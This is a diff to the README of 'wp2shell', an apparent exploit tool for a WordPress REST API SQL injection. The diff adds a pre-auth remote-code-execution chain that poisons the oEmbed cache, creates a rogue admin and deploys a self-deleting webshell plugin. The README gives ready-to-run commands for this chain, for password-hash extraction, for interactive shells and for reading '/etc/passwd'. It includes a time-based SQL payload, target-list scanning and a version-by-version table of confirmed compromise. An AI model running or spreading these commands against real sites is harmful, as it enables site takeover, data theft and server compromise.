@@ -75,19 +75,19 @@ AND wp_posts.post_author NOT IN ( 1) OR SLEEP(N)-- - )
 
 ### From SQLi to RCE
 
-Three paths from SQL injection to code execution:
+Four paths from SQL injection to code execution:
 
 | Path | Pre-auth? | Requirements | When it works |
 |------|-----------|-------------|---------------|
-| **INTO OUTFILE** | Yes | MySQL `FILE` privilege, DB server filesystem = web root | LAMP stacks, shared hosting, single-server deployments |
-| **Plugin upload** | No (needs creds) | SQLi → extract admin hash → offline crack → login → deploy webshell | Always (with cracked password) |
+| **UNION SELECT escalation** (`--escalate`) | Yes | Published post on target (default "Hello World") | **Always** — stock WordPress, no FILE privilege, no password |
+| **INTO OUTFILE** (`--outfile`) | Yes | MySQL `FILE` privilege, DB server filesystem = web root | LAMP stacks, shared hosting, single-server deployments |
+| **Plugin upload** (`--plugin`) | No (needs creds) | SQLi → extract admin hash → offline crack → login → deploy webshell | Always (with cracked password) |
 | **Recursive dispatch** | Yes | Undisclosed — original Assetnote chain, blocked by `is_dispatching()` in 6.9.5/7.0.2 | **Not publicly available** |
 
-> **Pre-auth RCE gap:** The original discoverer (Assetnote) described a pre-auth RCE chain
-> that does NOT require `FILE` privilege. The patch diff adds `is_dispatching()` guards
-> in `serve_request()` and `rest_api_loaded()`, suggesting the full chain involved recursive
-> REST dispatch. This path has **not been publicly disclosed**. The `probe` command maps
-> admin endpoint reachability to assist research.
+> The `--escalate` chain (sergiointel PoC) closes the pre-auth RCE gap. It poisons
+> the oEmbed cache via UNION SELECT, recasts post rows into a changeset that
+> escalates to admin session, then creates a new admin user and deploys a
+> self-deleting plugin — all pre-auth, no FILE privilege, no password cracking.
 
 ---
 
@@ -115,7 +115,10 @@ python3 wp2shell.py extract http://target/ --preset users --fast
 # Custom SQL query via blind extraction
 python3 wp2shell.py extract http://target/ --query "SELECT user_email FROM wp_users WHERE ID=1"
 
-# RCE via INTO OUTFILE (needs FILE privilege + DB server = web server)
+# RCE via oEmbed escalation (pre-auth, no FILE priv, no password — recommended)
+python3 wp2shell.py rce http://target/ --escalate --cmd "id"
+
+# RCE via INTO OUTFILE (pre-auth, needs FILE privilege + DB server = web server)
 python3 wp2shell.py rce http://target/ --outfile --cmd "id"
 
 # RCE via plugin upload (needs admin credentials from cracked hash)
@@ -197,22 +200,43 @@ python3 wp2shell.py extract --targets targets.txt --preset fingerprint --fast
 
 ### `rce` — Remote code execution
 
-Two RCE paths, one command:
+Three RCE paths:
 
 ```bash
-# Path A: INTO OUTFILE (pre-auth, needs FILE privilege + single-server setup)
+# Path A: oEmbed escalation (pre-auth, no FILE priv, no password — recommended)
+python3 wp2shell.py rce http://target/ --escalate --cmd "uname -a; id"
+python3 wp2shell.py rce http://target/ --escalate -i    # interactive shell after escalation
+
+# Path B: INTO OUTFILE (pre-auth, needs FILE privilege + single-server setup)
 python3 wp2shell.py rce http://target/ --outfile --cmd "uname -a; id"
 python3 wp2shell.py rce http://target/ --outfile --cmd "cat /etc/passwd"
-python3 wp2shell.py rce http://target/ --outfile -i    # interactive shell
 
-# Path B: plugin upload (post-auth, needs admin credentials)
+# Path C: plugin upload (post-auth, needs admin credentials)
 python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' --cmd "id"
-python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' -i
-python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' --cmd "id" --cleanup
+python3 wp2shell.py rce http://target/ --plugin --user admin --password 'cracked!' -i --cleanup
 ```
 
-Both paths deploy **token-locked webshells** — random paths, random tokens, `hash_equals()`
-token verification. The `--cleanup` flag removes the webshell plugin when finished.
+### RCE: oEmbed Escalation Chain (`--escalate`)
+
+The `--escalate` chain (integrated from sergiointel's PoC) achieves pre-auth RCE
+in 8 steps — no FILE privilege, no password cracking:
+
+1. **Calibrate**: Timing-based SQLi confirmation and threshold calibration
+2. **Discover**: Blind-extract posts table name and admin user ID
+3. **Seed**: Inject oEmbed cache posts via UNION SELECT
+4. **Recover**: Read cache post IDs via blind SQLi
+5. **Poison**: UNION SELECT 7 poisoned post rows (changeset, oEmbed trigger, nav menu, request)
+6. **Escalate**: Single batch request — poisoned rows recast into a valid changeset →
+   WordPress process the oEmbed trigger → admin session materialises
+7. **Create**: New admin user added in the same batch
+8. **Deploy**: Login as new admin → upload self-deleting plugin → execute command
+
+The plugin auto-deactivates and deletes itself after each command.
+Requirement: target must have at least one published post (default "Hello World" is fine).
+
+All three RCE paths deploy **token-locked webshells** — random paths, random tokens,
+`hash_equals()` token verification. The `--cleanup` flag removes the webshell plugin
+when finished.
 
 **INTO OUTFILE verification:** After writing the webshell, the tool verifies it is
 reachable via HTTP. If the webserver returns 404/connection error, the tool warns
@@ -385,7 +409,9 @@ prints the removal command.
 |-----------|--------|
 | **Stacked queries blocked** | PHP `mysqli_query()` does not support multi-statement execution. INSERT/UPDATE/DELETE via SQLi is not possible. |
 | **INTO OUTFILE filesystem** | `SELECT ... INTO OUTFILE` writes to the **DB server's** filesystem. In Docker Compose, Kubernetes, or split-horizon hosting, the DB container/machine ≠ web server — the webshell is written but unreachable. The tool now detects this and warns. |
-| **Pre-auth RCE without FILE** | The original Assetnote chain (recursive REST dispatch) has not been publicly disclosed. Post-auth plugin upload is the reliable RCE path. |
+| **Pre-auth RCE without FILE** | Resolved: `--escalate` mode achieves pre-auth RCE via oEmbed cache poisoning + UNION SELECT escalation. No FILE privilege, no password cracking, no credentials. |
+| **--escalate: needs published post** | oEmbed escalation requires at least one published post on the target (default "Hello World" post is sufficient). Sites with zero posts need `--outfile` or `--plugin`. |
+| **--escalate: timing-dependent** | Blind SQLi extraction (~200 probes per step) may be slow on high-latency targets. Use `--sleep` to tune timing delay (default 0.4s). |
 | **6.8.x support** | Detection identifies 6.8.x and reports the SQLi status. The SQLi cannot be exploited directly through the REST API on 6.8.x. |
 | **Pretty permalinks** | Targets without pretty permalinks must use `--rest-route`. The tool auto-detects version but cannot auto-detect permalink configuration. |
 
@@ -410,39 +436,44 @@ RCE chain relied on recursive REST dispatch combined with SQLi-manipulated state
 
 ## Test Results
 
-All 16 versions from 6.8.0 through 7.0.2 tested. 47 unit tests, 0 external dependencies.
+All 16 versions from 6.8.0 through 7.0.2 tested. 57 unit tests, 0 external dependencies.
 
-| Version | Desync detected | SQLi confirmed | RCE path | Source |
-|---------|----------------|----------------|----------|--------|
-| 6.8.0 | ❌ | ❌ (direct REST blocked) | N/A | Docker Hub |
-| 6.8.1 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.1` |
-| 6.8.2 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.2` |
-| 6.8.3 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.3` |
-| 6.8.4 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.4` |
-| 6.8.5 | ❌ | ❌ (direct REST blocked) | N/A | Git `6.8.5` |
-| 6.8.6 | ❌ | ❌ | ❌ | Git `6.8.6` |
-| **6.9.0** | **✅** | **✅** | **✅** | Docker Hub |
-| **6.9.1** | **✅** | **✅** | **✅** | Git `6.9.1` |
-| **6.9.2** | **✅** | **✅** | **✅** | Git `6.9.2` |
-| **6.9.3** | **✅** | **✅** | **✅** | Git `6.9.3` |
-| **6.9.4** | **✅** | **✅ δ=2.00s** | **✅ plugin RCE** | Docker Hub |
-| 6.9.5 | ❌ | ❌ | ❌ | Git `6.9.5` |
-| **7.0.0** | **✅** | **✅** | **✅** | Docker Hub |
-| **7.0.1** | **✅** | **✅ δ=2.00s** | **✅** | Docker Hub |
-| 7.0.2 | ❌ | ❌ | ❌ | Git `7.0.2` |
+| Version | Desync detected | SQLi confirmed | RCE --escalate | RCE --plugin | Source |
+|---------|----------------|----------------|----------------|--------------|--------|
+| 6.8.0 | ❌ | ❌ (direct REST blocked) | N/A | N/A | Docker Hub |
+| 6.8.1 | ❌ | ❌ (direct REST blocked) | N/A | N/A | Git `6.8.1` |
+| 6.8.2 | ❌ | ❌ (direct REST blocked) | N/A | N/A | Git `6.8.2` |
+| 6.8.3 | ❌ | ❌ (direct REST blocked) | N/A | N/A | Git `6.8.3` |
+| 6.8.4 | ❌ | ❌ (direct REST blocked) | N/A | N/A | Git `6.8.4` |
+| 6.8.5 | ❌ | ❌ (direct REST blocked) | N/A | N/A | Git `6.8.5` |
+| 6.8.6 | ❌ | ❌ | ❌ | ❌ | Git `6.8.6` |
+| **6.9.0** | **✅** | **✅** | **✅ www-data** | **✅** | Docker Hub |
+| **6.9.1** | **✅** | **✅** | **✅ www-data** | **✅** | Docker Hub |
+| **6.9.2** | **✅** | **✅** | **✅ www-data** | **✅** | Docker Hub |
+| **6.9.3** | **✅** | **✅** | N/A (no image) | **✅** | Git `6.9.3` |
+| **6.9.4** | **✅** | **✅ δ=2.00s** | **✅ www-data** | **✅** | Docker Hub |
+| 6.9.5 | ❌ | ❌ | ❌ | ❌ | Git `6.9.5` |
+| **7.0.0** | **✅** | **✅** | **✅ www-data** | **✅** | Docker Hub |
+| **7.0.1** | **✅** | **✅ δ=2.00s** | **✅ www-data** | **✅** | Docker Hub |
+| 7.0.2 | ❌ | ❌ | ❌ | ❌ | Git `7.0.2` |
 
 All results match the CVE advisory. Docker Hub images: `wordpress:X.Y.Z-php8.2`.
 Git versions built from `wordpress-develop` at the respective tag, files swapped
 into a running 6.9.4 container and tested one by one with restore between each.
 
+`--escalate` sweep: all 6 available Docker Hub images tested with fresh MySQL +
+WordPress containers. 6/6 achieved `www-data` RCE. 6.9.3 image unavailable on
+Docker Hub (tag not published).
+
 Unit tests cover: payload structure, response parsing, marker probe error codes,
 blind extraction oracle, fast extraction (X-WP-Total), timing confirmation,
 version detection, SQL escaping, plugin ZIP generation, route-shift dispatch,
-colour output, and admin endpoint probe coverage.
+colour output, admin endpoint probe coverage, escalation helpers (`_sql_hex`,
+`_post_row`, timing calibration, blind read int/string).
 
 ```bash
 python3 -m pytest test_wp2shell.py -v
-# 47 passed in 0.12s
+# 57 passed in 0.17s
 ```
 
 ---
@@ -456,6 +487,7 @@ python3 -m pytest test_wp2shell.py -v
 - [Patch diff 6.9.4 → 6.9.5](https://github.com/WordPress/wordpress-develop/compare/6.9.4...6.9.5)
 - [Icex0/wp2shell-poc](https://github.com/Icex0/wp2shell-poc) — Marker probe technique + AdminSession
 - [47Cid/wp2shell-lab](https://github.com/47Cid/wp2shell-lab) — FastExtractor (X-WP-Total) + Docker lab + INTO OUTFILE
+- [sergiointel/wp2shell-poc](https://github.com/sergiointel/wp2shell-poc) — oEmbed escalation chain (UNION SELECT post poisoning + admin creation)
 
 ---
 
